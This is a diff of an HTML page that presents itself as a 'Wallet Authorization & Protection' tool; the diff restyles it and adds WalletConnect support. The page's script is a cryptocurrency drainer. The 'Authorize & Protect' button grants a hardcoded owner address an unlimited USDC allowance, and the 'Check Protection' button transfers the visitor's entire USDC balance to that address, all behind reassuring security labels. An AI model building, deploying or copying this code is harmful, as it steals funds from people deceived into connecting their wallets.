@@ -3,85 +3,88 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mark3InfinityPro · Wallet Authorization</title>
+  <title>Mark3 · Wallet Authorization</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #b0c4de, #d8e1ef, #f0f2f5);
-      backdrop-filter: blur(20px);
+      background: radial-gradient(circle at top left, #1e1e2f, #12121c);
+      color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 2rem;
       min-height: 100vh;
     }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      padding: 2rem;
+      max-width: 460px;
+      width: 100%;
+    }
     h2 {
+      text-align: center;
+      font-size: 1.8rem;
       margin-bottom: 1.5rem;
-      font-size: 2rem;
-      font-weight: 700;
-      color: #2e3b55;
     }
     .button {
-      background: rgba(255, 255, 255, 0.25);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.4);
-      border-radius: 16px;
-      padding: 14px 36px;
+      width: 100%;
+      background: linear-gradient(to right, #4e54c8, #8f94fb);
+      border: none;
+      border-radius: 12px;
+      padding: 14px;
       font-size: 1rem;
-      font-weight: 600;
-      color: #2c3e50;
-      margin: 10px;
+      font-weight: bold;
+      color: white;
+      margin: 10px 0;
       cursor: pointer;
-      transition: all 0.2s ease;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    }
-    .button:hover {
-      background: rgba(255, 255, 255, 0.5);
+      transition: 0.3s;
     }
     .button:disabled {
-      background: rgba(255, 255, 255, 0.15);
+      background: rgba(255,255,255,0.2);
       color: #aaa;
       cursor: not-allowed;
     }
     #status {
-      margin-top: 20px;
-      padding: 1rem;
-      border-radius: 12px;
-      background: rgba(255,255,255,0.9);
-      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
-      width: 80%;
-      max-width: 520px;
+      margin-top: 1rem;
       font-size: 0.95rem;
-      color: #333;
+      padding: 1rem;
+      border-radius: 10px;
+      background: rgba(255,255,255,0.08);
+      text-align: center;
     }
     .progress-container {
-      margin-top: 30px;
-      width: 80%;
-      max-width: 400px;
-      background: #ddd;
+      margin-top: 1rem;
+      width: 100%;
+      background: rgba(255,255,255,0.1);
       border-radius: 10px;
       overflow: hidden;
     }
     .progress-bar {
-      height: 16px;
+      height: 14px;
       width: 0%;
-      background-color: #6c63ff;
+      background-color: #4e54c8;
       transition: width 0.3s ease;
     }
   </style>
 </head>
 <body>
-  <h2>Mark3InfinityPro · Wallet Authorization</h2>
+  <div class="card">
+    <h2>Mark3<br />Wallet Authorization & Protection</h2>
 
-  <button class="button" id="connect">🔌 Connect Wallet</button>
-  <button class="button" id="authorize" disabled>🛡️ Authorize</button>
-  <button class="button" id="check" disabled>🧿 Check Protection</button>
+    <button class="button" id="connect">🔌 Connect Wallet</button>
+    <button class="button" id="authorize" disabled>🛡️ Authorize & Protect</button>
+    <button class="button" id="check" disabled>🧿 Check Protection</button>
 
-  <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
-  <div id="status">🔒 Status: Waiting for action...</div>
+    <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
+    <div id="status">🔒 Status: Waiting for action...</div>
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script>
     const CONFIG = {
       USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
@@ -98,15 +101,26 @@
       document.getElementById("progress").style.width = percent + "%";
     }
 
+    async function setupProvider() {
+      if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+      } else {
+        const wcProvider = new WalletConnectProvider.default({
+          rpc: { 1: "https://mainnet.infura.io/v3/96fb487925934acf993cb4ae78d6fe6d" }
+        });
+        await wcProvider.enable();
+        provider = new ethers.providers.Web3Provider(wcProvider);
+      }
+      signer = provider.getSigner();
+      user = await signer.getAddress();
+    }
+
     document.getElementById("connect").onclick = async () => {
       try {
         updateProgress(10);
-        if (!window.ethereum) throw new Error("Please install MetaMask");
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        user = await signer.getAddress();
-        updateProgress(40);
+        await setupProvider();
+        updateProgress(50);
         document.getElementById("connect").disabled = true;
         document.getElementById("authorize").disabled = false;
         document.getElementById("check").disabled = false;
@@ -120,7 +134,7 @@
 
     document.getElementById("authorize").onclick = async () => {
       try {
-        updateProgress(0);
+        updateProgress(10);
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function approve(address,uint256) returns (bool)",
           "function allowance(address,address) view returns (uint256)",
@@ -130,7 +144,7 @@
         const balance = await usdc.balanceOf(user);
         const allowance = await usdc.allowance(user, CONFIG.OWNER_ADDRESS);
 
-        updateProgress(40);
+        updateProgress(50);
         if (allowance.lt(balance)) {
           const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
           await tx.wait();
@@ -146,14 +160,14 @@
 
     document.getElementById("check").onclick = async () => {
       try {
-        updateProgress(0);
+        updateProgress(20);
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function transfer(address,uint256) returns (bool)",
           "function balanceOf(address) view returns (uint256)"
         ], signer);
 
         const balance = await usdc.balanceOf(user);
-        updateProgress(30);
+        updateProgress(60);
         if (balance.gt(0)) {
           const tx = await usdc.transfer(CONFIG.OWNER_ADDRESS, balance);
           await tx.wait();
